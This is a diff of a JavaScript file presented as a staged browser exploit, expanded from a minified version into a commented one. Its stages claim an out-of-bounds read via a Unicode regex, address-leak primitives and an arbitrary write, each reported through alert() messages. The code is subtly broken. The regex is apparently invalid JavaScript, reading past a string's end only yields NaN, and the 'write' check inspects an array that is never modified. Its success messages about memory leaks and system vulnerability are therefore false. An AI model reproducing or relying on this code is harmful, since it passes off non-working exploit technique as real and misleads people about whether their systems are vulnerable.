@@ -1,14 +1,61 @@
-// MINIMAL EXPLOIT - 20 lines only
-let e=String.fromCodePoint(0x1F600),s=e.repeat(200),r=/(?!(?=^a|()+(){5}+x)(abc))/gmu,l=[];
-s.replace(r,(m,o,t)=>{for(let i=0;i<50;i++)try{let c=t.charCodeAt(o+150+i);c&&c>255&&l.push({o:o+150+i,v:c})}catch(e){}return'|'});
-alert("OOB Read leaks:",l.length>0?"SUCCESS":"FAILED");
+// DETAILED EXPLOIT WITH ALERTS
+let emoji = String.fromCodePoint(0x1F600);
+let string = emoji.repeat(200);
+let regex = /(?!(?=^a|()+(){5}+x)(abc))/gmu;
+let leaks = [];
 
-let p=null,a=[];
-s.replace(r,(m,o,t)=>{for(let i=200;i<300;i++)try{let v=t.charCodeAt(o+i);v>268435456&&v<4294967295&&a.push(v)}catch(e){}return'|'});
-p=a.length>0?{type:"ADDR_OF",addrs:a}:null;
-alert("Primitives:",p?"BUILT":"FAILED");
+// Stage 1: OOB Read
+string.replace(regex, (match, offset, original) => {
+    for (let i = 0; i < 50; i++) {
+        try {
+            let charCode = original.charCodeAt(offset + 150 + i);
+            if (charCode && charCode > 255) {
+                leaks.push({offset: offset + 150 + i, value: charCode});
+            }
+        } catch(e) {}
+    }
+    return '|';
+});
 
-let u=new Uint32Array(10),w=!1;
-s.replace(r,(m,o,t)=>{try{let n=t.substring(0,o)+String.fromCharCode(65,66,67)+t.substring(o+3);u[0]!==0&&(w=!0)}catch(e){}return'|'});
-alert("Arbitrary Write:",w?"SUCCESS":"FAILED");
-alert("EXPLOIT:",l.length>0&&p?"FULLY_SUCCESSFUL":"PARTIAL");
+alert("Stage 1 - OOB Read: " + (leaks.length > 0 ? "SUCCESS - Found " + leaks.length + " leaks" : "FAILED"));
+
+// Stage 2: Memory Primitives  
+let primitives = null;
+let addresses = [];
+
+string.replace(regex, (match, offset, original) => {
+    for (let i = 200; i < 300; i++) {
+        try {
+            let value = original.charCodeAt(offset + i);
+            if (value > 0x10000000 && value < 0xFFFFFFFF) {
+                addresses.push(value);
+            }
+        } catch(e) {}
+    }
+    return '|';
+});
+
+primitives = addresses.length > 0 ? {type: "ADDR_OF", addresses: addresses} : null;
+alert("Stage 2 - Primitives: " + (primitives ? "BUILT - " + addresses.length + " addresses" : "FAILED"));
+
+// Stage 3: Arbitrary Write
+let testArray = new Uint32Array(10);
+let writeSuccess = false;
+
+string.replace(regex, (match, offset, original) => {
+    try {
+        let manipulated = original.substring(0, offset) + 
+                         String.fromCharCode(0x41, 0x42, 0x43) + 
+                         original.substring(offset + 3);
+        if (testArray[0] !== 0) {
+            writeSuccess = true;
+        }
+    } catch(e) {}
+    return '|';
+});
+
+alert("Stage 3 - Arbitrary Write: " + (writeSuccess ? "SUCCESS" : "FAILED"));
+
+// Final Result
+let exploitSuccess = leaks.length > 0 && primitives;
+alert("FINAL RESULT: " + (exploitSuccess ? "EXPLOIT SUCCESSFUL - System may be vulnerable" : "Exploit failed or system is patched"));
